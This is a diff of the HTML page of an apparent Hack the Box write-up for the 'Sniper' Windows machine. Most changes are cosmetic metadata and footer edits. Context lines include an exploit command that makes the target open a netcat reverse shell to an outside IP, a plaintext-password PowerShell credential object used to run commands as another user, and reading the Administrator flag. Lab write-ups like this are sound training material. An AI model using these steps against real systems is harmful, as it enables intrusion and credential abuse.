@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
   
-    <title>Sniper [Medium] - Windows :: 5ysk3y Pwnz — An online resource for Hack the Box stuff</title>
+    <title>Sniper [Medium] - Windows :: 5ysk3y Pwnz</title>
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content="Overview Sniper was one of my favorite boxes from recent memory. It leverages an RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&amp;rsquo;s referenced and included as a gist for your viewing." />
 <meta name="keywords" content="HTB, Hack the Box" />
 <meta name="robots" content="noodp" />
@@ -23,7 +23,7 @@
 
 
 
-<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://5ysk3y.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="apple-touch-icon" href="https://5ysk3y.github.io/img/apple-touch-icon-192x192.png">
 
   <link rel="shortcut icon" href="https://5ysk3y.github.io/img/favicon/blue.png">
 
@@ -31,17 +31,19 @@
 
 <meta name="twitter:card" content="summary" />
 
-  <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
 
-<meta name="twitter:creator" content="" />
 
 
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
-<meta property="og:title" content="Sniper [Medium] - Windows :: 5ysk3y Pwnz">
+<meta property="og:title" content="Sniper [Medium] - Windows">
 <meta property="og:description" content="Overview Sniper was one of my favorite boxes from recent memory. It leverages an RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&amp;rsquo;s referenced and included as a gist for your viewing." />
 <meta property="og:url" content="https://5ysk3y.github.io/htb/guides/sniper/" />
-<meta property="og:site_name" content="Sniper [Medium] - Windows" />
+<meta property="og:site_name" content="5ysk3y Pwnz" />
 
   
     <meta property="og:image" content="https://5ysk3y.github.io/img/favicon/blue.png">
@@ -65,7 +67,7 @@
 
 
 </head>
-<body class="">
+<body class="blue">
 
 
 <div class="container headings--one-size">
@@ -80,7 +82,9 @@
 </a>
 
     </div>
-    <div class="menu-trigger">menu</div>
+    
+      <div class="menu-trigger">menu</div>
+    
   </div>
   
     <nav class="menu">
@@ -369,11 +373,11 @@ while($output = mysqli_fetch_array($result)) {
 <li>This will serve nc64 and save it in Windows temp dir. We can then call it using the same powershell syntax, ensuring you have netcat listening:</li>
 </ol>
 <p><code>python exploit.py &quot;powershell.exe -nop -exec bypass -c C:\\Windows\\temp\\nc64.exe 10.10.14.23 9002 -e powershell&quot;</code></p>
-<p>From there we can use our enumerated data to login as the user account; we know the username is Chris, and some trial and error logins to crackmapexec show we also have a valid password from the databsae file - not many passwords have been found up to now, but attempting to use Chris&rsquo; username with the MySQL password we found earlier does yield results. Let&rsquo;s setup our credential object so we can privesc:</p>
+<p>From there we can use our enumerated data to login as the user account; we know the username is Chris, and some trial and error logins to crackmapexec show we also have a valid password from the databsae file - not many passwords have been found up to now, but attempting to use Chris' username with the MySQL password we found earlier does yield results. Let&rsquo;s setup our credential object so we can privesc:</p>
 <pre><code>$user = &quot;SNIPER\Chris&quot;
 $pass = ConvertTo-SecureString &quot;36mEAhz/B8xQ~2VM&quot; -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential($user,$pass)
-</code></pre><p>And then use it to execute code as Chris&rsquo; user, e.g:</p>
+</code></pre><p>And then use it to execute code as Chris' user, e.g:</p>
 <pre><code>PS C:\inetpub\wwwroot\blog&gt; Invoke-Command -ComputerName SNIPER -ScriptBlock { whoami } -Credential $creds
 sniper\chris
 </code></pre><p>From there I downloaded another copy of nc64.exe that would be owned by Chris:</p>
@@ -468,7 +472,7 @@ PS C:\Windows\system32&gt; type C:\Users\Administrator\Desktop\root.txt
   <div class="footer__inner">
     
       <div class="copyright">
-        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+        <span>© 2021 Powered by <a href="http://gohugo.io">Hugo</a></span>
     
         <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
       </div>
@@ -477,6 +481,8 @@ PS C:\Windows\system32&gt; type C:\Users\Administrator\Desktop\root.txt
 
 <script src="https://5ysk3y.github.io/assets/main.js"></script>
 <script src="https://5ysk3y.github.io/assets/prism.js"></script>
+
+
 
 
 
